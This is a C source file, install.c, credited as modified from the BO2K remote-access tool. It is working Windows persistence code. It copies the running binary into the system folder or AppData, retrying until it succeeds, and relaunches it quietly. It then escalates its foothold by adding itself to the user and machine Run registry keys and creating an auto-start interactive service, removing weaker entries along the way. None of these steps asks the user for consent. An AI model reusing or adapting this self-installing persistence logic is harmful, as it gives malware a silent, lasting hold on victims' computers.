/* 
 * install.c -- Installation (Modified from BO2K)
 * (C) 1999-2002, Cult Of The Dead Cow,
 * (C) 2003-2006, BO2K Development Team
 * 
 * Modifications (C) 2012  Martin Wolters
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to 
 * the Free Software Foundation, Inc.
 * 51 Franklin Street, Fifth Floor
 * Boston, MA  02110-1301, USA
 * 
 */

#include <Windows.h>
#include <ShlObj.h>

#include <stdio.h>
#include "..\include\install.h"

#define SYS_REGKEY "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
#define USR_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"

int ilevel = 0;

char TargetNameUsr[MAX_PATH];
char TargetNameSys[MAX_PATH], *FilePartSys;
char ModuleFilename[MAX_PATH];

void GetIlevel(void) {
	char InstallPath[MAX_PATH];
	char AppDataPath[MAX_PATH];
	char RegPath[512];
	char buf[512];
	DWORD RegPathLen = 512;
	DWORD len = 512;
	HKEY key;
	SC_HANDLE scm;

	HMODULE ModuleHandle = GetModuleHandle(NULL);
	GetModuleFileNameA(ModuleHandle, ModuleFilename, MAX_PATH);
	
	SHGetFolderPathA(NULL, CSIDL_SYSTEMX86, NULL, SHGFP_TYPE_CURRENT, InstallPath);
//	GetSystemDirectoryA(InstallPath, MAX_PATH);
	strncat(InstallPath, "\\", MAX_PATH);
	strncat(InstallPath, INSTALL_FILENAME, MAX_PATH);
	GetFullPathNameA(InstallPath, MAX_PATH, TargetNameSys, &FilePartSys);

	SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, AppDataPath);
	_snprintf(TargetNameUsr, MAX_PATH, "%s\\%s", AppDataPath, INSTALL_FILENAME);

	/* Determine current install level */

	/* Level 1: Installed, not automatically run */	
	if(GetFileAttributesA(TargetNameSys) != INVALID_FILE_ATTRIBUTES) {
		ilevel = 1;
	} else if(GetFileAttributesA(TargetNameUsr) != INVALID_FILE_ATTRIBUTES) {
		ilevel = 1;
		strncpy(TargetNameSys, TargetNameUsr, MAX_PATH);
	}

	/* Level 2: Installed, run from user registry key */
	if(ilevel == 1)
		if(RegCreateKeyA(HKEY_CURRENT_USER, USR_REGKEY, &key) == ERROR_SUCCESS)
			if(RegQueryValueExA(key, FilePartSys, NULL, NULL, (BYTE *)RegPath, &RegPathLen) == ERROR_SUCCESS)
				if(lstrcmpiA(RegPath, TargetNameSys) == 0)
					ilevel = 2;
	
	/* Level 3: Installed, run from system-wide registry key */
	if(ilevel == 1)
		if(RegCreateKeyA(HKEY_LOCAL_MACHINE, SYS_REGKEY, &key) == ERROR_SUCCESS)
			if(RegQueryValueExA(key, FilePartSys, NULL, NULL, (BYTE *)RegPath, &RegPathLen) == ERROR_SUCCESS)
				if(lstrcmpiA(RegPath, TargetNameSys) == 0)
					ilevel = 3;					
	

	/* Level 4: Installed, run as service */
	if(ilevel == 1) {
		scm = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
		if(scm)
			if(GetServiceDisplayNameA(scm, SERVICE_NAME, buf, &len))
				ilevel = 4;
	}
}

void TryRaiseIlevel(void) {
	int OldIlevel = ilevel;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	char CmdLine[2048];
	SC_HANDLE scm, svc;
	char Binary[1024];
	HKEY key;

	if((ilevel == 0) || (lstrcmpiA(ModuleFilename, TargetNameSys) != 0)) {
		while(CopyFileA(ModuleFilename, TargetNameSys, FALSE) == 0) {
			if(GetLastError() == ERROR_ACCESS_DENIED) {
				while(CopyFileA(ModuleFilename, TargetNameUsr, FALSE) == 0)
					Sleep(1000);
				lstrcpynA(TargetNameSys, TargetNameUsr, strlen(TargetNameUsr) + 1);
				break;
			}
			Sleep(1000);
		}
		lstrcpynA(CmdLine, TargetNameSys, 2048);

		memset(&si, 0, sizeof(STARTUPINFO));
		si.cb = sizeof(STARTUPINFO);
		si.dwFlags = STARTF_FORCEOFFFEEDBACK;

		CreateProcessA(NULL, CmdLine, NULL, NULL, 0, 0, NULL, NULL, &si, &pi);

		exit(0);
	}

	if((ilevel > 0) && (ilevel < 4)) {
		scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
		if(scm) {
			sprintf(Binary, "\"%s\"", TargetNameSys);

			svc = CreateServiceA(scm, SERVICE_NAME, SERVICE_NAME, 0,
				SERVICE_WIN32_OWN_PROCESS | SERVICE_INTERACTIVE_PROCESS,
				SERVICE_AUTO_START, SERVICE_ERROR_IGNORE, Binary,
				NULL, NULL, NULL, NULL, NULL);

			if(svc) {
				ilevel = 4;
				CloseServiceHandle(svc);
			}
			CloseServiceHandle(scm);
		}
	}

	if((ilevel > 0) && (ilevel < 3)) {
		if(RegOpenKeyA(HKEY_LOCAL_MACHINE, SYS_REGKEY, &key) == ERROR_SUCCESS) {
			if(RegSetValueExA(key, FilePartSys, 0, REG_SZ, (BYTE *)TargetNameSys, strlen(TargetNameSys)) == ERROR_SUCCESS)
				ilevel = 3;
			RegCloseKey(key);
		}
	}

	if((ilevel > 0) && (ilevel < 2)) {
		if(RegOpenKeyA(HKEY_CURRENT_USER, USR_REGKEY, &key) == ERROR_SUCCESS) {
			if(RegSetValueExA(key, FilePartSys, 0, REG_SZ, (BYTE *)TargetNameSys, strlen(TargetNameSys)) == ERROR_SUCCESS)
				ilevel = 2;
			RegCloseKey(key);
		}
	}

	if(OldIlevel != ilevel) {
		if(OldIlevel == 2) {
			if(RegOpenKeyA(HKEY_CURRENT_USER, USR_REGKEY, &key)==ERROR_SUCCESS) {
				RegDeleteValueA(key, FilePartSys);
				RegCloseKey(key);
			}
		} else if(OldIlevel == 3) {
			if(RegOpenKeyA(HKEY_LOCAL_MACHINE, SYS_REGKEY, &key)==ERROR_SUCCESS) {
				RegDeleteValueA(key, FilePartSys);
				RegCloseKey(key);
			}
		}
	}
}